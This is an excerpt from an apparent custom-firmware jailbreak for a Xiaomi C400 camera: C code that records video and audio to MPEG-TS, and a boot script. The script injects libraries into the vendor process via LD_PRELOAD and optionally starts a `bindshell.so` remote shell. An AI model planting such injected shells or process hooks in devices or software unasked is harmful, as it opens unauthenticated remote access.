  r = mpeg_ts_add_stream(ts, PSI_STREAM_AUDIO_OPUS, NULL, 0);
  assert(r > 0 && "Unable to add OPUS audio stream");
  int opus_stream_id = r;

  r = board_system_init(1, 0);
  assert(r == 0 && "board_system_init failed");

  while (1) {
    { // VIDEO
      struct astruct a;
      r = get_video_stream(0, VIDEO_BUF, 0x7ffe0, &a);
      if (r < 0) {
        // frame is not ready yet
        assert(r == -1 && "get_video_stream error");
      } else {
        if (has_sdcard) {
          fsync(fileno(current_output_file));
        }
        uint64_t pts = a.PTS * 90 / 1000;
        r = mpeg_ts_write(ts, hevc_stream_id, 0, pts, pts, VIDEO_BUF,
                          a.frame_size);
        assert(r == 0 && "Video muxing error");
        if (has_sdcard) {
          fflush_unlocked(current_output_file);
          imi_api_led_on(ORANGE_LED, 0);
        }
      }
    }
    { // AUDIO
      struct astruct2 b;
      r = get_audio_stream_ex((uint8_t *)AUDIO_BUF, sizeof(AUDIO_BUF), &b);
      assert(r == 0 && "get_audio_stream_ex error");

      assert(b.u32Len == sizeof(AUDIO_BUF) && "Wrong audio packet size");

      r = opus_encode(enc, AUDIO_BUF, AUDIO_FRAME_SIZE, AUDIO_OPUS,
                      sizeof(AUDIO_OPUS));
      assert(r >= 0 && "OPUS encode error");
      if (r > 2) {
        int opus_encoded_size = r;
        uint64_t pts = b.u64TimeStamp * 90 / 1000;
        r = mpeg_ts_write(ts, opus_stream_id, 0, pts, pts, AUDIO_OPUS,
                          opus_encoded_size);
        assert(r == 0 && "Audio muxing error");
      }
    }
  }
  return 0;
}

__attribute__((constructor)) static void _start() { exit(main()); }

```

`xiaomi-c400-jailbreak/src/sysctl`:

```
#!/bin/sh

export PATH=/mnt/usr/bin:/bin:/sbin:/usr/bin:/usr/sbin
export LD_LIBRARY_PATH=/mnt/usr/lib

# orange led disable
echo 0 > /sys/class/gpio/gpio77/value

S=/mnt/sdcard
J=/mnt/data/jailbreak

for _ in 1 2 3 4 5
do
    if mount /dev/mmcblk0p1 $S || mount /dev/mmcblk0 $S
    then
        if [ -f $S/factory_reset ]
        then
            rm -rf /mnt/data/bin $J $S/factory_reset
            ln -sf /mnt/usr/bin /mnt/data/bin
            reboot -f
        fi
        export HAS_SDCARD=1
        break
    fi
    echo waiting for sdcard
    sleep 1
done

set -a
. $J/config.env
set +a

mkfifo /tmp/pipe_to_tls
while true
do
    LD_PRELOAD=$J/recorder.so /mnt/usr/bin/imi_mike
    sleep 5
done &

(
    sh /mnt/usr/etc/init.d/S*mstar_ko start

    ifconfig wlan0 up
    iwconfig wlan0 mode Managed
    mkdir -p /var/run/wpa_supplicant
    wpa_supplicant -Dnl80211 -iwlan0 -c $J/wpa_supplicant.conf -B
    wpa_cli -i wlan0 -B -a /mnt/usr/bin/wpa_event.sh
    udhcpc -i wlan0 -S -x hostname:C400
    
    [ "$BINDSHELL" = "1" ] && while true
    do
        LD_PRELOAD=$J/bindshell.so /mnt/usr/bin/imi_mike
        sleep 5
    done &

    while true
    do
        LD_PRELOAD=$J/recorder.so SEND_TO_SERVER=1 /mnt/usr/bin/imi_mike
        sleep 5
    done &
) &

sh
reboot -f

```
